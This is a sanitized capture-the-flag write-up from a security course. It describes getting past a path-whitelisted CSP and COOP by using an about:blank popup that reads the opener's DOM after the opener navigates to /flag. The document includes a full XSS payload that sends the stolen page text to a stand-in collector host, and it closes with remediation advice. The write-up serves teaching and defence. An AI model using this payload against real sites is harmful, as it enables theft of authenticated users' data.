# Historical report: Csp Fun Window Navigation

> Sanitized archival COMP6443 lab writeup. The larger assessment is team work; no exclusive individual authorship is inferred. Reported success is historical and has not been freshly reproduced. Addresses, accounts, identities, flags, encoded evidence, and screenshots are omitted or replaced. Code is illustrative and may contain draft errors. Read [review notes](../docs/report-review-notes.md).

# CSP Fun Writeup

## Challenge Overview

The goal of this challenge was to steal the flag from an administrator bot. 

The application exposed two key features:

1. A page with a reflection-based XSS vulnerability (`/?data=`).

2. A **Report Content** feature that allowed submitting a payload for an admin bot to visit.

At first glance, it seemed like a standard XSS challenge. However, further testing showed that it was heavily protected by a restrictive Content-Security-Policy (CSP), cross-origin isolation (COOP), and strict headless browser behaviours.

---

## Initial Analysis

The homepage contained a form that reflected user input without sanitisation:

```html

<form action="/" method="get">

  <textarea name="data"></textarea>

  <input type="submit" />

</form>

```

The application also had a highly restrictive CSP:

HTTP

```

Content-Security-Policy: default-src [https://lab.example.invalid/98.css](https://lab.example.invalid/98.css) [https://lab.example.invalid/ms_sans_serif.woff](https://lab.example.invalid/ms_sans_serif.woff) [https://lab.example.invalid/ms_sans_serif.woff2](https://lab.example.invalid/ms_sans_serif.woff2) [https://lab.example.invalid/ms_sans_serif_bold.woff](https://lab.example.invalid/ms_sans_serif_bold.woff) [https://lab.example.invalid/ms_sans_serif_bold.woff2](https://lab.example.invalid/ms_sans_serif_bold.woff2) [https://lab.example.invalid/report](https://lab.example.invalid/report) 'unsafe-inline';

```

Through initial manual testing, it was discovered that a hint was set in the cookie: `flag=The flag can be accessed by performing a GET request to /flag`. Manually setting this cookie and visiting `/flag` revealed that the actual flag was printed as plain text in the response body, but only for the authenticated admin bot.

------

## Failed Approaches

Several ideas were tested and discarded before reaching the intended solution.

### 1. Fetching the flag via JavaScript

Executing `fetch('/flag')` or embedding `<iframe src="/flag">` failed immediately. The CSP `default-src` was missing the `'self'` directive and instead strictly whitelisted specific static file paths. Since `/flag` was not in the whitelist, the browser blocked the request at the network level.

### 2. Using Window.open and reading the DOM

Since background requests were blocked by CSP, top-level navigation (`window.open('/flag')`) was used to force the bot to load the flag. However, attempting to read `w.document.body.innerText` resulted in a `Cross-Origin` error. This indicated that the `/flag` endpoint was protected by `Cross-Origin-Opener-Policy` (COOP) or a Sandbox, completely isolating the new window from the opener.

### 3. Aggressive polling and Bot NetworkIdle

To combat the transition state of the popup, an aggressive polling mechanism (`setInterval`) was deployed. However, the bot (Puppeteer/Playwright) would close the browser prematurely. The bot relied on a `networkidle` mechanism; once the main page stopped making network requests, the bot assumed the task was complete and killed the process before the popup could fully load the flag.

### 4. POST request to /flag

Tested if `/flag` had a hidden POST endpoint that reflected input, hoping to inject an XSS directly into the flag's origin. The server responded with `Cannot POST /flag`, confirming it was a strictly static GET endpoint.

------

## Key Insight

The key weakness was understanding the exceptions within the browser's security model:

- **Top-level navigation bypasses CSP:** While `default-src` blocks `fetch` and `iframe`, it cannot block `window.location.href = '/flag'`.

- **`about:blank` inherits context:** If a new window is opened to `about:blank`, it perfectly inherits the origin and context of its opener. It does not trigger COOP isolation.

- **Navigation keeps the bot alive:** Navigating the main window to `/flag` creates network activity, which tricks the bot's `networkidle` check into waiting for the page to load.

This turned the problem into a structural bypass: instead of the main window reading a popup, a popup must read the main window while the main window navigates.

------

## Exploitation Strategy

The strategy involved sending a payload via the `/report` endpoint that executed the following chain:

1. The main window opens a new popup to `about:blank` (the Helper).

2. The Helper is injected with a script that continuously polls `opener.document.body.innerText`.

3. The main window navigates itself to `/flag`.

4. The bot waits for `/flag` to load.

5. Once loaded, the Helper observes the flag on the opener's DOM, encodes it, and exfiltrates it via top-level navigation to a webhook.

The final payload sent to the bot:

JavaScript

```

let payload = '<script>' +

  'let w = window.open("about:blank");' +

  'w.document.write("<script>let iv = setInterval(()=>{ try { let d = opener.document.body.innerText; if (d.length > 5 && !d.includes(\\"CSP FUN\\")) { clearInterval(iv); location.href = \\"[https://collector.example.invalid/REDACTED/?genius=](https://collector.example.invalid/REDACTED/?genius=)\\" + encodeURIComponent(btoa(d)); } } catch(e){} }, 100);</scr" + "ipt>");' +

  'window.location.href = "/flag";' +

'</script>';

fetch('/report', {

  method: "POST",

  headers: { "Content-Type": "application/json" },

  body: JSON.stringify({ data: payload })

});

```

------

## Why the Attack Worked

The application relied on a heavily restricted CSP and COOP to prevent DOM-based exfiltration. However, the implementation failed because `about:blank` popups retain the origin of their creator.

When the main window navigated to `/flag`, it remained within the same origin (`lab.example.invalid`). Because the Helper window inherited the origin of the main window before the navigation, the browser permitted the Helper to read the main window's DOM even after it transitioned to `/flag`. Furthermore, navigating the main window prevented the headless bot from closing early.

------

## Result

After submitting the payload through the console to the `/report` endpoint, the webhook received the exfiltrated data:

Plaintext

```

genius=[REDACTED ENCODED EVIDENCE]

```

Decoding the Base64 value revealed the flag:

Plaintext

```

[REDACTED LAB FLAG]

```

------

## Security Impact

This challenge demonstrates that strict Content-Security-Policies (using path whitelists without `'self'`) and Cross-Origin Opener Policies (COOP) can be bypassed if the application allows arbitrary JavaScript execution (e.g., `'unsafe-inline'`). Attackers can manipulate window references, `about:blank` inheritance, and top-level navigation to bypass network restrictions and read sensitive same-origin data.

------

## Remediation

A secure implementation should:

1. Never use `'unsafe-inline'` in a CSP. Use strong nonces or hashes for scripts.

2. Avoid using explicit path-based whitelists as a substitute for proper origin definitions.

3. Sanitise all user input contextually before reflecting it in the HTML response to prevent the initial XSS vulnerability.

4. Require re-authentication or use stateless tokens for sensitive endpoints rather than relying solely on cookie-based authentication for administrative actions.

------

## Final Notes

The important lesson from this challenge is that **"strict network restrictions" do not solve XSS.** If an attacker can execute arbitrary JavaScript, they can leverage browser-native behaviours like `about:blank` and `window.opener` to sidestep restrictions. Defence-in-depth requires eliminating the injection vector itself, rather than just trying to contain its network capabilities.